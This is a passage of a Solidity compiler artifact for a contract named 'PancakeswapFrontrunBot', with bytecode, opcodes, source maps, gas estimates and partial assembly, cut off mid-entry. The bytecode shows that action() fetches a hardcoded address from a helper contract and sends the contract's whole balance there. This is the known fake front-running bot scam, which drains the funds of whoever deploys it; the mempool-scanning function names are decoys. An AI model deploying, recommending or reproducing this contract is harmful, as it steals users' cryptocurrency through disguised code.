RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2EF JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2C4 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2EF JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2D2 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x38D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x362 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x38D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x370 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH11 0x34B6F2A9E6CBE19FC31E8D PUSH21 0xA568D91FDD0BE6A6FDE71EBECD067CF00023416473 PUSH16 0x6C634300060600336080604052348015 PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x8C3BCF4E19996EDEC11B5F0523C6A0151A75D351 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH29 0x5CD2ED4FF54CF52113D1CA38C771AE309ADACDA0D8005E79B722D2B252 AND 0xD8 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "367:17284:3:-:0;;;519:185;5:9:-1;2:2;;;27:1;24;17:12;2:2;519:185:3;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;519:185:3;;;;;;;;;;;;;19:11:-1;14:3;11:20;8:2;;;44:1;41;34:12;8:2;71:11;66:3;62:21;55:28;;123:4;118:3;114:14;159:9;141:16;138:31;135:2;;;182:1;179;172:12;135:2;219:3;213:10;330:9;325:1;311:12;307:20;289:16;285:43;282:58;261:11;247:12;244:29;233:115;230:2;;;361:1;358;351:12;230:2;384:12;379:3;372:25;420:4;415:3;411:14;404:21;;0:432;;519:185:3;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;519:185:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;19:11:-1;14:3;11:20;8:2;;;44:1;41;34:12;8:2;71:11;66:3;62:21;55:28;;123:4;118:3;114:14;159:9;141:16;138:31;135:2;;;182:1;179;172:12;135:2;219:3;213:10;330:9;325:1;311:12;307:20;289:16;285:43;282:58;261:11;247:12;244:29;233:115;230:2;;;361:1;358;351:12;230:2;384:12;379:3;372:25;420:4;415:3;411:14;404:21;;0:432;;519:185:3;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;519:185:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;615:10;603:9;:22;;;;;;;;;;;;:::i;:::-;;650:12;636:11;:26;;;;;;;;;;;;:::i;:::-;;683:13;;;;;:::i;:::-;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;683:13:3;673:7;;:23;;;;;;;;;;;;;;;;;;519:185;;367:17284;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100385760003560e01c80630a7a1c4d146100445780636c02a9311461004e5780637b61c320146100de5761003f565b3661003f57005b600080fd5b61004c61016e565b005b34801561005a57600080fd5b50610063610259565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a3578082015181840152602081019050610088565b50505050905090810190601f1680156100d05780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ea57600080fd5b506100f36102f7565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610133578082015181840152602081019050610118565b50505050905090810190601f1680156101605780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663feae9ad36040518163ffffffff1660e01b815260040160206040518083038186803b1580156101d657600080fd5b505afa1580156101ea573d6000803e3d6000fd5b505050506040513d602081101561020057600080fd5b810190808051906020019092919050505073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610256573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102ef5780601f106102c4576101008083540402835291602001916102ef565b820191906000526020600020905b8154815290600101906020018083116102d257829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561038d5780601f106103625761010080835404028352916020019161038d565b820191906000526020600020905b81548152906001019060200180831161037057829003601f168201915b50505050508156fea26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA7A1C4D EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDE JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4C PUSH2 0x16E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x63 PUSH2 0x259 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x88 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD0 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF3 PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x133 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x118 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x160 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFEAE9AD3 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1EA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x256 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2EF JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2C4 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2EF JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2D2 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x38D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x362 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x38D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x370 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH11 0x34B6F2A9E6CBE19FC31E8D PUSH21 0xA568D91FDD0BE6A6FDE71EBECD067CF00023416473 PUSH16 0x6C634300060600330000000000000000 ",
							"sourceMap": "367:17284:3:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;15951:125:3;;;:::i;:::-;;409:23;;5:9:-1;2:2;;;27:1;24;17:12;2:2;409:23:3;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;409:23:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;439:25;;5:9:-1;2:2;;;27:1;24;17:12;2:2;439:25:3;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;439:25:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15951:125;16004:7;;;;;;;;;;;:29;;;:31;;;;;;;;;;;;;;;;;;;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;16004:31:3;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;16004:31:3;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;16004:31:3;;;;;;;;;;;;;;;;15996:49;;:72;16046:21;15996:72;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;15996:72:3;15951:125::o;409:23::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;439:25::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "194200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"action()": "infinite",
								"tokenName()": "infinite",
								"tokenSymbol()": "infinite"
							},
							"internal": {
								"_callFrontRunActionMempool()": "infinite",
								"beyond(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"calcLiquidityInContract(struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"findPtr(uint256,uint256,uint256,uint256)": "infinite",
								"getMemPoolDepth()": "infinite",
								"getMemPoolHeight()": "infinite",
								"getMemPoolLength()": "infinite",
								"getMemPoolOffset()": "infinite",
								"keccak(struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"memcpy(uint256,uint256,uint256)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"nextContract(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"orderContractsByLiquidity(struct PancakeswapFrontrunBot.slice memory)": "infinite",
								"parseMemoryPool(string memory)": "infinite",
								"toHexDigit(uint8)": "infinite",
								"uint2str(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "80"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "CALLVALUE",
									"source": 3
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSHSIZE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "CODESIZE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSHSIZE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "CODECOPY",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "40"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP5",
									"source": 3
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
